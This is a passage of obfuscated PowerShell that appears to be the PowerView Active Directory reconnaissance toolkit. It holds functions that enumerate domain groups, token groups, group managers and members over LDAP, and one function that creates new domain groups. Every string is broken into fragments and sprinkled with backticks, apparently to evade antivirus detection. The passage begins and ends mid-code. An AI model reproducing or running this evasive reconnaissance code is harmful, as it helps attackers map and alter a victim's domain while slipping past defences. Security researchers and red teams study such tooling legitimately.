        if (${p`sboUnDpaR`AmE`TErs}[("{0}{1}"-f'D','omain')]) { ${SEarC`He`RaR`GuMENts}[("{2}{1}{0}"-f 'n','mai','Do')] = ${DoM`Ain} }
        if (${psbOu`NDPA`RaMe`T`eRs}[("{2}{1}{0}{3}" -f 't','r','Prope','ies')]) { ${SeAr`cHERaR`Gu`mentS}[("{0}{2}{1}" -f 'Propert','es','i')] = ${pR`op`erTiES} }
        if (${pSb`Ou`ND`PaRA`MetE`Rs}[("{2}{0}{1}" -f'h','Base','Searc')]) { ${sEaR`cher`ArGu`mEntS}[("{2}{3}{0}{1}"-f'a','se','S','earchB')] = ${SeaRC`H`BaSE} }
        if (${pSb`OunD`PARamete`Rs}[("{0}{1}"-f'Serv','er')]) { ${SEa`RCh`eRAR`gUMe`NTs}[("{0}{1}{2}"-f'S','erv','er')] = ${se`R`VEr} }
        if (${ps`BOu`N`dpARAmetE`RS}[("{1}{2}{0}" -f'pe','Sear','chSco')]) { ${sE`Arch`erARGU`mEn`Ts}[("{0}{2}{1}"-f'Sea','e','rchScop')] = ${sear`ChSC`oPE} }
        if (${ps`BoU`ND`PA`R`AMEterS}[("{1}{2}{0}" -f 'ize','ResultPag','eS')]) { ${SE`ARcher`Ar`G`UM`eNtS}[("{2}{4}{0}{1}{3}" -f 'ul','tPageSi','R','ze','es')] = ${rE`s`UlTp`AgES`iZE} }
        if (${pS`BoUnd`P`ARaMET`e`RS}[("{1}{2}{0}{3}" -f'imi','ServerTim','eL','t')]) { ${Se`Arch`e`RARGUMENTs}[("{2}{1}{4}{3}{0}" -f'mit','v','Ser','rTimeLi','e')] = ${serVE`RTiMElIm`It} }
        if (${psBo`UND`PAramEtE`RS}[("{0}{1}{2}"-f 'Securi','t','yMasks')]) { ${sEAR`cH`erA`R`GUme`NTS}[("{1}{0}{2}{3}"-f'ecurity','S','Ma','sks')] = ${S`eCuRITY`m`ASks} }
        if (${p`SboUNd`PArA`MeTeRS}[("{1}{0}" -f 'tone','Tombs')]) { ${SeARCheRaR`g`U`meNTS}[("{2}{0}{1}"-f 'b','stone','Tom')] = ${t`o`MbstoNE} }
        if (${psbO`UND`pA`RAmeters}[("{0}{3}{1}{2}"-f 'Crede','i','al','nt')]) { ${Se`Ar`CHErarG`UM`EntS}[("{1}{2}{0}"-f'ntial','Cre','de')] = ${cR`e`DENtiAl} }
        ${G`ROUPsea`RCheR} = &("{1}{4}{0}{3}{5}{2}"-f'in','Get-','r','Searc','Doma','he') @SearcherArguments
    }

    PROCESS {
        if (${GrouP`seARc`HeR}) {
            if (${pSBO`UNDP`A`Ram`eT`eRs}[("{1}{2}{0}"-f'dentity','Member','I')]) {

                if (${SEArC`h`e`RAR`gumENts}[("{2}{3}{0}{1}" -f 'pertie','s','P','ro')]) {
                    ${o`L`d`pRop`eRties} = ${s`EA`Rc`HERArG`UmEntS}[("{1}{0}{2}"-f'oper','Pr','ties')]
                }

                ${SeaRcHE`RaRgUme`N`TS}[("{1}{2}{0}"-f'y','Id','entit')] = ${M`EMb`ERidentI`Ty}
                ${sE`A`Rc`hEra`Rgume`Nts}['Raw'] = ${t`RUE}

                &("{1}{4}{3}{2}{0}" -f'ct','G','nObje','mai','et-Do') @SearcherArguments | &("{1}{0}{2}" -f'Ea','For','ch-Object') {
                    
                    ${obJeCT`d`IRECTOryen`Try} = ${_}.("{1}{4}{2}{0}{3}{5}"-f 'ectory','G','r','Ent','etDi','ry').Invoke()

                    
                    ${oBJ`eCTdIR`eCT`orY`EntrY}.("{2}{1}{0}"-f 'shCache','fre','Re').Invoke(("{2}{1}{0}"-f 's','okenGroup','t'))

                    ${OBJeCTd`IreCTO`RYE`NT`Ry}."t`OKeN`gr`OUPs" | &("{2}{1}{0}" -f 'ject','Each-Ob','For') {
                        
                        ${g`Ro`UpSid} = (&("{2}{0}{1}" -f'O','bject','New-') ("{10}{6}{8}{9}{0}{12}{13}{3}{2}{7}{11}{1}{4}{5}"-f 'c','t','pal','inci','if','ier','s','.SecurityI','te','m.Se','Sy','den','ur','ity.Pr')(${_},0))."Va`lUE"

                        
                        if (${GrOup`s`iD} -notmatch ("{2}{0}{1}"-f '-1','-5-32-.*','^S')) {
                            ${Se`ArchEr`Arg`UM`ENTS}[("{0}{2}{1}"-f'Iden','ity','t')] = ${grOU`Psid}
                            ${SEarcHER`A`RG`UMeNtS}['Raw'] = ${F`A`lSE}
                            if (${oldPR`OPER`TI`eS}) { ${sE`ARchERa`R`Gu`MeNtS}[("{2}{0}{1}"-f 'ie','s','Propert')] = ${O`lD`prOPErT`IES} }
                            ${GR`oUP} = &("{4}{0}{3}{2}{1}" -f'et-Do','t','ainObjec','m','G') @SearcherArguments
                            if (${G`R`oup}) {
                                ${G`ROuP}."p`S`obJECt"."tYp`ENa`mes".("{1}{0}" -f 'nsert','I').Invoke(0, ("{3}{2}{4}{0}{1}"-f'w','.Group','rV','Powe','ie'))
                                ${GrO`UP}
                            }
                        }
                    }
                }
            }
            else {
                ${iD`e`NTI`TYf`ILTEr} = ''
                ${FIL`TER} = ''
                ${iD`enTI`TY} | &("{0}{1}{2}" -f'Where','-Obje','ct') {${_}} | &("{2}{0}{3}{4}{1}" -f'r','-Object','Fo','E','ach') {
                    ${iDEN`Ti`TYi`NsTAnCE} = ${_}.("{0}{1}{2}"-f 'R','e','place').Invoke('(', '\28').("{1}{0}{2}" -f'epl','R','ace').Invoke(')', '\29')
                    if (${ideNtIT`yI`N`sta`NCe} -match ("{1}{0}"-f'1-','^S-')) {
                        ${IDe`NtI`TY`Filt`ER} += "(objectsid=$IdentityInstance)"
                    }
                    elseif (${Id`EN`Tit`yINS`TaNCe} -match ("{0}{1}" -f '^C','N=')) {
                        ${I`DE`NtI`TYFiL`Ter} += "(distinguishedname=$IdentityInstance)"
                        if ((-not ${PSbO`UndPa`Ra`mETeRS}[("{1}{2}{0}" -f'ain','Do','m')]) -and (-not ${pSb`ounDp`Ar`AmeTe`RS}[("{0}{2}{1}" -f 'S','se','earchBa')])) {
                            
                            
                            ${i`DeN`TitY`dom`Ain} = ${IdEN`TITyInst`A`NCe}.("{1}{0}" -f 'tring','SubS').Invoke(${iD`EntIty`iNsTA`NCe}.("{0}{1}"-f'IndexO','f').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                            &("{3}{2}{0}{1}" -f 'erbos','e','e-V','Writ') ('['+'Ge'+'t-Do'+'m'+'ainG'+'roup] '+'Extra'+'cte'+'d '+'do'+'main'+' '+"'$IdentityDomain' "+'fro'+'m '+"'$IdentityInstance'")
                            ${seArcHeraR`Gum`E`N`Ts}[("{0}{2}{1}"-f 'D','ain','om')] = ${idEn`Ti`TyD`oma`In}
                            ${grOUp`S`e`Ar`ChER} = &("{4}{1}{2}{3}{0}" -f'er','Domain','Se','arch','Get-') @SearcherArguments
                            if (-not ${gr`o`UPSEAr`chEr}) {
                                &("{0}{3}{1}{2}"-f 'Write','ar','ning','-W') ('['+'Ge'+'t-'+'Dom'+'ai'+'nGroup] '+'U'+'n'+'able '+'to'+' '+'r'+'etri'+'eve '+'dom'+'ain'+' '+'sea'+'rch'+'er '+'fo'+'r '+"'$IdentityDomain'")
                            }
                        }
                    }
                    elseif (${ID`ENTiTY`I`NSta`N`CE} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        ${GUidbyTesT`Ri`NG} = (([Guid]${IDE`Nt`I`TyINst`AN`cE}).("{0}{2}{1}"-f'ToByte','y','Arra').Invoke() | &("{2}{0}{1}" -f 'orEach-Ob','ject','F') { '\' + ${_}.("{0}{2}{1}" -f 'ToS','ng','tri').Invoke('X2') }) -join ''
                        ${I`de`Nt`i`TYfILTeR} += "(objectguid=$GuidByteString)"
                    }
                    elseif (${Iden`T`iTyin`S`TaNCE}.("{2}{1}{0}"-f'tains','on','C').Invoke('\')) {
                        ${cO`NverT`Ed`id`eNTiTyinsTan`cE} = ${I`dEN`TitYinst`A`NCe}.("{0}{1}" -f 'Rep','lace').Invoke('\28', '(').("{0}{1}{2}" -f 'R','ep','lace').Invoke('\29', ')') | &("{0}{2}{1}{3}" -f'C','nvert-A','o','DName') -OutputType ("{2}{1}{0}" -f 'nonical','a','C')
                        if (${CO`N`VErTEd`IDeNtiTyInsta`NCE}) {
                            ${gr`OUP`dOm`Ain} = ${c`Onv`eRteD`I`DeNTityiNSTAnCE}.("{0}{1}" -f'Su','bString').Invoke(0, ${Co`N`VERtED`I`DEntitYInSTA`Nce}.("{1}{0}{2}"-f'ndex','I','Of').Invoke('/'))
                            ${grOu`pN`AME} = ${IdE`NtiTyIns`TA`NCe}.("{1}{0}" -f'lit','Sp').Invoke('\')[1]
                            ${iD`En`T`itYFilTER} += "(samAccountName=$GroupName)"
                            ${SE`ARCH`erAr`G`UmE`NtS}[("{0}{1}" -f'Doma','in')] = ${G`ROUp`doMAIN}
                            &("{3}{1}{4}{2}{0}" -f '-Verbose','i','e','Wr','t') ('[Ge'+'t'+'-Do'+'mai'+'nGro'+'up] '+'Ex'+'tract'+'ed '+'d'+'om'+'ain '+"'$GroupDomain' "+'from'+' '+"'$IdentityInstance'")
                            ${gR`oup`S`EA`RchER} = &("{4}{0}{2}{1}{3}"-f'om','earch','ainS','er','Get-D') @SearcherArguments
                        }
                    }
                    else {
                        ${i`Den`TiTYf`IltEr} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance))"
                    }
                }

                if (${iDeNt`i`Ty`FiL`TeR} -and (${id`ENtIt`YfI`Lt`ER}.("{0}{1}"-f'Tr','im').Invoke() -ne '') ) {
                    ${F`ilt`er} += "(|$IdentityFilter)"
                }

                if (${PsbOUN`DP`ARA`mE`TeRs}[("{2}{1}{0}"-f 'Count','dmin','A')]) {
                    &("{0}{1}{3}{2}"-f'Write-Ve','r','ose','b') ("{10}{9}{8}{3}{11}{4}{1}{7}{5}{0}{2}{6}"-f 'n','a','Co','arch','g for ','mi','unt=1','d','Group] Se','main','[Get-Do','in')
                    ${f`il`TeR} += (("{3}{4}{0}{2}{1}"-f'inco',')','unt=1','(a','dm'))
                }
                if (${pSBOUnd`PA`R`Ame`TE`RS}[("{0}{1}{2}"-f'G','roupS','cope')]) {
                    ${gROu`pS`COPeva`lUe} = ${pSbO`UND`P`ArAMet`ERS}[("{2}{1}{3}{0}"-f'ope','S','Group','c')]
                    ${F`i`lTER} = Switch (${GR`OupScO`p`evalUE}) {
                        ("{2}{1}{0}"-f 'cal','ainLo','Dom')       { ("{1}{2}{6}{4}{3}{0}{5}" -f ':1.2.840.113556.1','(','gr','Type','p','.4.803:=4)','ou') }
                        ("{1}{0}{2}" -f 'ai','NotDom','nLocal')    { ("{5}{4}{3}{11}{0}{8}{7}{2}{1}{6}{9}{10}" -f'4','.1.4.8','56',':1.','e','(!(groupTyp','03:=4','5','0.113',')',')','2.8') }
                        ("{2}{1}{0}"-f 'l','loba','G')            { (("{3}{0}{5}{6}{1}{4}{2}"-f 'pe:1.2','0.113','4.803:=2)','(groupTy','556.1.','.8','4')) }
                        ("{1}{2}{0}" -f 'Global','No','t')         { ("{3}{2}{8}{7}{10}{9}{5}{4}{1}{0}{6}"-f '=2','56.1.4.803:','!(g','(','35','0.11','))','pTyp','rou','84','e:1.2.') }
                        ("{0}{1}{2}" -f'Uni','ve','rsal')         { ("{3}{5}{0}{1}{6}{2}{4}"-f'.2','.840.','6','(groupTy','.1.4.803:=8)','pe:1','11355') }
                        ("{1}{2}{0}"-f 'sal','NotUni','ver')      { ((("{5}{4}{6}{3}{1}{2}{0}" -f ':=8))','6.1.4.8','03','5','pType:1.2.','(!(grou','840.1135'))) }
                    }
                    &("{0}{1}{2}"-f'Write-Verb','o','se') ('[Ge'+'t-'+'DomainGrou'+'p'+']'+' '+'S'+'earc'+'hin'+'g '+'for'+' '+'gro'+'up '+'s'+'cope'+' '+"'$GroupScopeValue'")
                }
                if (${Ps`B`ouNDP`Ar`Am`etErs}[("{0}{1}{2}" -f'Gr','oupProper','ty')]) {
                    ${Gro`UpPRO`pe`RTYval`Ue} = ${PSb`Oun`Dp`ARaMeT`ERs}[("{1}{4}{2}{3}{0}" -f 'ty','G','upPr','oper','ro')]
                    ${fi`L`Ter} = Switch (${gR`Ou`PP`ROpErTyVA`luE}) {
                        ("{2}{1}{0}" -f'y','it','Secur')              { ("{0}{11}{8}{2}{10}{4}{1}{12}{7}{6}{3}{9}{5}" -f'(g','0.11','pT','2','pe:1.2.84','483648)','803:=','556.1.4.','u','147','y','ro','3') }
                        ("{0}{1}{2}" -f 'Dist','ri','bution')          { ((("{8}{0}{7}{6}{2}{1}{4}{5}{3}"-f 'pe:1.2.','.1.','6','483648))','4.80','3:=2147','40.11355','8','(!(groupTy'))) }
                        ("{1}{2}{0}"-f'em','CreatedBy','Syst')       { ("{5}{2}{7}{3}{9}{4}{6}{1}{0}{8}"-f '1.4','.','Type:1.2.','0','5','(group','56','84','.803:=1)','.113') }
                        ("{2}{0}{4}{3}{1}" -f'reated','em','NotC','ySyst','B')    { ((("{4}{5}{6}{3}{1}{2}{0}"-f '.4.803:=1))','1.2.840.11','3556.1','pe:','(!(','g','roupTy'))) }
                    }
                    &("{1}{2}{0}{3}"-f 'Ve','Wr','ite-','rbose') ('[G'+'e'+'t-Do'+'mai'+'nGroup]'+' '+'S'+'ea'+'rch'+'ing '+'f'+'or '+'group'+' '+'pro'+'perty'+' '+"'$GroupPropertyValue'")
                }
                if (${PS`B`o`Un`DpARamEt`ErS}[("{2}{1}{0}" -f 'r','APFilte','LD')]) {
                    &("{2}{0}{1}" -f '-Verb','ose','Write') ('[Get-Domain'+'G'+'r'+'oup] '+'Usin'+'g '+'a'+'dd'+'itional '+'L'+'DAP '+'filte'+'r: '+"$LDAPFilter")
                    ${Fi`l`Ter} += "$LDAPFilter"
                }

                ${Gr`OupS`eArC`heR}."f`IlT`eR" = "(&(objectCategory=group)$Filter)"
                &("{2}{0}{3}{1}" -f 'Ver','ose','Write-','b') "[Get-DomainGroup] filter string: $($GroupSearcher.filter) "

                if (${psBou`N`dpa`RaMEtE`RS}[("{1}{0}"-f'ndOne','Fi')]) { ${re`sU`lTS} = ${G`Roupse`Ar`c`hEr}.("{1}{0}"-f 'indOne','F').Invoke() }
                else { ${RE`S`ULTS} = ${GR`Ou`pSEa`R`cHeR}.("{1}{2}{0}" -f'l','FindA','l').Invoke() }
                ${reS`Ul`Ts} | &("{0}{1}{2}"-f 'W','here-','Object') {${_}} | &("{0}{3}{1}{2}" -f 'ForE','Objec','t','ach-') {
                    if (${PSbou`ND`p`ArAmETerS}['Raw']) {
                        
                        ${gR`OUp} = ${_}
                    }
                    else {
                        ${G`R`ouP} = &("{0}{5}{3}{4}{1}{2}" -f'Co','DAPProp','erty','vert-','L','n') -Properties ${_}."pro`PeRtI`Es"
                    }
                    ${g`RouP}."PsoBJ`E`ct"."t`YpENaMES".("{2}{0}{1}"-f'er','t','Ins').Invoke(0, ("{0}{2}{1}"-f'Pow','roup','erView.G'))
                    ${GR`oUP}
                }
                if (${Re`SU`LTS}) {
                    try { ${Re`SUL`TS}.("{1}{0}" -f'ose','disp').Invoke() }
                    catch {
                        &("{1}{2}{0}{3}"-f 'bo','Write','-Ver','se') ("{14}{0}{2}{10}{12}{8}{7}{1}{9}{11}{15}{5}{13}{3}{6}{4}"-f'ain',' ','G','ult','ject','R','s ob','disposing',' ','o','roup] Erro','f th','r','es','[Get-Dom','e ')
                    }
                }
                ${grOU`pSe`ARchEr}.("{2}{1}{0}" -f'se','po','dis').Invoke()
            }
        }
    }
}


function NEW-Do`MaI`Ng`Roup {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{5}{2}{8}{1}{0}{7}{4}{3}{6}" -f'a','houldProcessForStateCh','se','tio','gFunc','PSU','ns','ngin','S'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{4}{0}{2}" -f'e','houldPr','ss','PSS','oc'}, '')]
    [OutputType({"{6}{1}{0}{2}{5}{3}{8}{4}{7}"-f 'e','yS','rvices.','ageme','GroupPrincipa','AccountMan','Director','l','nt.'})]
    Param(
        [Parameter(mAnDAtOrY = ${Tr`Ue})]
        [ValidateLength(0, 256)]
        [String]
        ${sa`m`ACc`ouNTnAme},

        [ValidateNotNullOrEmpty()]
        [String]
        ${N`Ame},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DIsPLaY`NA`ME},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`ES`CrIp`TIOn},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Do`maiN},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`RedE`NtiaL} =   $0dSqR::"em`pTy"
    )

    ${conte`Xt`AR`GU`Ments} = @{
        ("{1}{2}{0}" -f 'y','Ident','it') = ${SAm`ACc`ouNtN`Ame}
    }
    if (${p`sB`OuNDpAr`AME`TeRS}[("{0}{1}" -f'Dom','ain')]) { ${c`On`TeXtaRGUMe`N`Ts}[("{0}{1}" -f 'D','omain')] = ${Do`ma`In} }
    if (${p`SBouN`D`paRam`ETe`RS}[("{2}{1}{0}"-f'al','nti','Crede')]) { ${cO`NtextarGUM`E`NTs}[("{0}{2}{1}"-f 'Cr','al','edenti')] = ${CR`E`dE`NTIal} }
    ${co`NtExT} = &("{1}{2}{3}{0}" -f 'xt','Get-P','rincipalCon','te') @ContextArguments

    if (${C`oNT`Ext}) {
        ${G`R`OUp} = &("{0}{1}{2}{3}" -f'New-O','b','jec','t') -TypeName ("{12}{16}{14}{10}{11}{3}{1}{2}{5}{9}{15}{7}{4}{0}{6}{8}{13}"-f 'in','es.A','c','rvic','Pr','countManag','c','.Group','ip','emen','r','ySe','Syst','al','ecto','t','em.Dir') -ArgumentList (${Co`Nt`EXt}."cO`Nt`ext")

        
        ${g`RO`UP}."Sa`mACcOU`NtnaME" = ${CO`NTE`xT}."I`dEnti`TY"

        if (${PS`BO`UnDparaM`E`TE`RS}[("{1}{0}" -f 'ame','N')]) {
            ${GR`o`Up}."n`Ame" = ${N`AME}
        }
        else {
            ${g`RoUp}."nA`ME" = ${cOn`Te`xT}."IDENt`ItY"
        }
        if (${psB`ounDpArAMeT`e`Rs}[("{0}{1}{2}" -f'Displ','ayN','ame')]) {
            ${G`Roup}."D`I`s`PlAyNamE" = ${di`sPl`AY`NaME}
        }
        else {
            ${G`RO`Up}."dISp`laY`NAMe" = ${C`onte`xt}."I`deN`TItY"
        }

        if (${pSB`OU`NDp`ArAME`T`ERS}[("{2}{0}{1}" -f'rip','tion','Desc')]) {
            ${Gr`oUp}."DESCR`ip`T`ion" = ${dEScrIP`T`i`On}
        }

        &("{2}{3}{0}{1}"-f 'Verb','ose','Write','-') ('['+'New-Doma'+'inGroup]'+' '+'A'+'ttempti'+'ng '+'t'+'o '+'c'+'reate'+' '+'grou'+'p '+"'$SamAccountName'")
        try {
            ${n`ULl} = ${GR`OUp}.("{1}{0}"-f 'ave','S').Invoke()
            &("{3}{2}{1}{0}" -f'rbose','Ve','ite-','Wr') ('[New-Do'+'mainGroup'+']'+' '+'Gr'+'oup '+"'$SamAccountName' "+'succe'+'s'+'sfully '+'cr'+'ea'+'ted')
            ${Gr`o`Up}
        }
        catch {
            &("{0}{3}{1}{2}" -f'W','e-Wa','rning','rit') ('[Ne'+'w'+'-DomainG'+'r'+'oup] '+'E'+'rro'+'r '+'creat'+'i'+'n'+'g '+'gro'+'up '+"'$SamAccountName' "+': '+"$_")
        }
    }
}


function G`E`T-DO`maIn`MaN`AGEDsEcU`RIT`y`GrOUp {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{1}{3}{4}"-f 'S','Sho','P','u','ldProcess'}, '')]
    [OutputType({"{1}{2}{4}{5}{8}{7}{6}{3}{0}" -f 'tyGroup','P','o','curi','w','erVie','ManagedSe','.','w'})]
    [CmdletBinding()]
    Param(
        [Parameter(positiON = 0, VALUefroMPiPELine = ${Tr`Ue}, valUefrOmpIpElInEbYpropErtYNAmE = ${tR`UE})]
        [Alias({"{0}{1}"-f'Nam','e'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${D`omaIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'ADS','Path'})]
        [String]
        ${Se`Ar`chBASe},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{4}{2}{0}{1}"-f'ro','ller','nt','Do','mainCo'})]
        [String]
        ${SeRv`Er},

        [ValidateSet({"{1}{0}"-f 'e','Bas'}, {"{0}{1}" -f 'OneLeve','l'}, {"{0}{2}{1}"-f'Subt','e','re'})]
        [String]
        ${Sea`R`ChSCoPE} = ("{1}{2}{0}"-f 'ree','Sub','t'),

        [ValidateRange(1, 10000)]
        [Int]
        ${ResU`L`Tpa`G`eSIzE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${se`R`VeRTImEl`ImIT},

        [Switch]
        ${T`oMbst`OnE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`EDEn`TiAL} =  ( GET-vARIAbLe ("0d"+"SQr")).VaLuE::"e`MptY"
    )

    BEGIN {
        ${SEarCH`Er`ArG`U`MeNTs} = @{
            ("{1}{0}{2}"-f'DA','L','PFilter') = (("{1}{9}{8}{5}{0}{10}{2}{4}{6}{11}{7}{3}" -f 'age','(&','y=*)(groupType:1.','483648))','2.','n','840.113556.1.4','147','a','(m','dB','.803:=2'))
            ("{1}{2}{0}" -f 'es','Pr','operti') = ("{5}{4}{9}{6}{8}{0}{3}{2}{7}{1}" -f'pe,samacc','ame','t','oun','a','distinguishedName,m','By,samac','n','countty','naged')
        }
        if (${p`sbOUndParaMET`E`Rs}[("{0}{1}{2}"-f'S','e','archBase')]) { ${sea`RChEr`ARG`UM`eNTS}[("{0}{2}{3}{1}"-f'S','hBase','ear','c')] = ${SeaR`CH`BasE} }
        if (${PSBoUn`dP`Ar`AMETErS}[("{1}{0}" -f'erver','S')]) { ${seaRCHE`RA`RGUm`E`N`TS}[("{0}{1}" -f'Serv','er')] = ${S`E`RVer} }
        if (${pSB`o`Un`DpARa`M`eTErs}[("{0}{2}{1}"-f 'Se','pe','archSco')]) { ${S`E`ArchERAr`g`UMENTs}[("{2}{1}{3}{0}" -f'cope','ch','Sear','S')] = ${SEA`Rc`hsC`oPE} }
        if (${psBo`UN`d`PaRAMETeRS}[("{2}{1}{0}" -f'ize','eS','ResultPag')]) { ${SearC`He`RARG`U`MENTs}[("{3}{2}{0}{1}" -f'ltPageS','ize','esu','R')] = ${r`E`SU`LT`PAgEsIzE} }
        if (${PSBoUN`dp`A`R`AME`TErS}[("{2}{1}{3}{0}" -f 't','eLi','ServerTim','mi')]) { ${sEA`Rc`HERa`RgUmENtS}[("{1}{2}{0}{4}{3}" -f'verTimeLi','S','er','it','m')] = ${seRve`R`TiMEl`I`MIT} }
        if (${p`sB`o`UnDPAra`mE`TerS}[("{0}{1}{2}"-f 'Securi','tyM','asks')]) { ${se`A`RcheRar`gume`N`Ts}[("{2}{3}{1}{0}" -f'sks','Ma','Securi','ty')] = ${secuRITYMA`S`Ks} }
        if (${pSBoUndp`ARa`Me`TErS}[("{0}{1}"-f'Tombst','one')]) { ${SEarCH`ERa`R`GU`meNTS}[("{0}{2}{1}"-f 'To','e','mbston')] = ${t`OmB`stO`Ne} }
        if (${pS`BOU`Ndp`A`Ram`ETErS}[("{1}{3}{2}{0}"-f 'al','Cr','i','edent')]) { ${S`e`ARcH`erarguMENtS}[("{3}{1}{0}{2}" -f 'en','ed','tial','Cr')] = ${creD`en`TIaL} }
    }

    PROCESS {
        if (${pS`BOu`ND`paraM`eTErS}[("{1}{0}" -f'omain','D')]) {
            ${seA`RChER`AR`GuMe`N`Ts}[("{2}{1}{0}" -f'in','a','Dom')] = ${DOm`AIN}
            ${T`ARgETDO`M`A`in} = ${dOmA`in}
        }
        else {
            ${TA`R`Getd`OM`AIn} = ${EnV:USeRd`N`Sd`o`maiN}
        }

        
        &("{1}{2}{3}{0}"-f'omainGroup','G','et-','D') @SearcherArguments | &("{2}{3}{0}{4}{1}" -f 'Ob','t','ForEach','-','jec') {
            ${SE`ARcHera`R`gUMentS}[("{1}{2}{0}" -f'es','Proper','ti')] = ("{5}{12}{1}{3}{8}{6}{0}{14}{4}{10}{13}{7}{9}{11}{2}" -f 'a','guish','e,objectsid','ed','ac','d',',n','mac','name','countna','counttyp','m','istin','e,sa','me,sam')
            ${S`e`ARcheRaRg`Ume`N`Ts}[("{1}{0}{2}"-f 'en','Id','tity')] = ${_}."Mana`GEd`By"
            ${Nu`LL} = ${s`Ea`R`ChErArGUmENTs}.("{0}{1}"-f'Remov','e').Invoke(("{1}{2}{3}{0}"-f'ilter','L','DAP','F'))

            
            
            ${g`ROup`mA`Nag`eR} = &("{0}{2}{4}{3}{1}" -f'G','t','et-','jec','DomainOb') @SearcherArguments
            
            ${m`A`NAgeDgRoUp} = &("{1}{2}{0}"-f 'Object','Ne','w-') ("{1}{0}"-f'SObject','P')
            ${M`ANAgE`dGrO`UP} | &("{2}{1}{0}" -f'r','mbe','Add-Me') ("{3}{0}{1}{2}"-f 'ot','epro','perty','N') ("{0}{2}{1}"-f'G','oupName','r') ${_}."sAM`Acco`UN`TnAMe"
            ${mA`NAGe`d`GRoup} | &("{1}{0}{2}" -f'd-Mem','Ad','ber') ("{0}{2}{1}{3}" -f'No','eproper','t','ty') ("{2}{0}{4}{3}{1}{5}"-f 'ou','ui','Gr','isting','pD','shedName') ${_}."DIs`TINgU`Is`HEdnA`mE"
            ${m`ANaGE`DgR`oUP} | &("{2}{1}{0}"-f 'ber','Mem','Add-') ("{0}{3}{2}{1}"-f'Notepr','rty','pe','o') ("{0}{1}{2}" -f 'Manag','e','rName') ${gR`O`U`PmanAGEr}."saM`ACcOuNT`NA`mE"
            ${Ma`N`A`gEDgroup} | &("{1}{3}{2}{0}" -f 'er','A','d-Memb','d') ("{3}{2}{1}{0}" -f'ty','roper','p','Note') ("{3}{7}{2}{4}{0}{1}{5}{6}"-f'Disti','ngui','nage','M','r','shedNa','me','a') ${gR`oUP`ma`NAG`er}."D`i`StINGuisHe`Dna`ME"

            
            if (${GRO`UpMan`AGeR}."SAM`A`Cc`ouN`TTYpe" -eq 0x10000000) {
                ${Man`AgEdG`R`OUp} | &("{1}{2}{0}" -f 'r','Ad','d-Membe') ("{1}{0}{2}{3}"-f 'rop','Notep','er','ty') ("{0}{1}{2}{3}"-f'Manage','rT','yp','e') ("{1}{0}" -f'oup','Gr')
            }
            elseif (${G`ROuPmANAG`er}."sa`m`AcCOUNT`TyPe" -eq 0x30000000) {
                ${Man`A`geDGR`Oup} | &("{2}{0}{1}"-f '-Me','mber','Add') ("{2}{1}{3}{0}" -f 'rty','teprop','No','e') ("{2}{0}{3}{1}"-f'anag','e','M','erTyp') ("{0}{1}"-f'Us','er')
            }

            ${a`cL`ArGUM`e`NTs} = @{
                ("{2}{1}{0}"-f'ty','i','Ident') = ${_}."DIsTi`N`GU`ishEDnAme"
                ("{2}{1}{3}{0}"-f'er','ghtsFil','Ri','t') = ("{0}{1}{2}"-f 'Wr','i','teMembers')
            }
            if (${pSbo`Undp`ArAmE`T`ers}[("{0}{2}{1}"-f 'S','rver','e')]) { ${a`cLAr`gumEN`TS}[("{2}{0}{1}" -f'rve','r','Se')] = ${s`E`RVER} }
            if (${PS`BO`UNdpArAmete`Rs}[("{0}{1}{3}{2}" -f'S','ea','pe','rchSco')]) { ${aCLarG`UmEN`Ts}[("{2}{0}{1}" -f 'rchS','cope','Sea')] = ${sEAr`CHSC`OPE} }
            if (${pSbOUNDp`A`Ra`MetE`RS}[("{4}{2}{3}{0}{1}"-f'iz','e','tPage','S','Resul')]) { ${aCl`Ar`guM`EntS}[("{2}{3}{0}{1}" -f 'Siz','e','ResultPag','e')] = ${R`EsultpAGE`sIZE} }
            if (${P`sBou`NDparame`T`eRS}[("{2}{1}{0}{3}"-f'Li','Time','Server','mit')]) { ${AC`lArgU`m`enTS}[("{0}{4}{2}{1}{3}" -f 'S','meLim','rTi','it','erve')] = ${s`ervE`R`TimElI`MiT} }
            if (${psBou`ND`par`A`m`eteRs}[("{1}{2}{3}{0}"-f 'one','T','om','bst')]) { ${a`cL`Arg`U`menTS}[("{1}{0}"-f 'mbstone','To')] = ${tO`mbSt`OnE} }
            if (${PSb`o`U`ND`paR`AmeTERs}[("{2}{1}{0}" -f 'dential','re','C')]) { ${aCl`A`RgumENTS}[("{1}{0}{2}"-f 'de','Cre','ntial')] = ${C`RE`dentiAl} }

            
            
            
            
            
            
            
            
            
            
            

            ${MA`NageD`GrO`UP} | &("{1}{2}{0}" -f'Member','A','dd-') ("{2}{1}{0}" -f 'y','ropert','Notep') ("{2}{0}{1}"-f'anager','CanWrite','M') ("{1}{0}" -f 'N','UNKNOW')

            ${m`ANAgE`Dgr`ouP}."PSob`jECt"."TY`peNAmES".("{2}{1}{0}" -f 'rt','nse','I').Invoke(0, ("{6}{7}{9}{1}{3}{5}{2}{8}{4}{0}"-f'Group','ag','ec','e','ity','dS','Pow','erView','ur','.Man'))
            ${mA`NAge`DGR`O`UP}
        }
    }
}


function GEt-d`omain`GrOup`me`mb`ER {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{1}{2}"-f 'PS','ro','cess','ShouldP'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{5}{0}{6}{1}{2}{3}{9}{7}{8}{4}{10}" -f 'S','rsM','o','reT','t','P','UseDeclaredVa','signme','n','hanAs','s'}, '')]
    [OutputType({"{5}{2}{1}{0}{3}{4}" -f 'iew.Gro','werV','o','upM','ember','P'})]
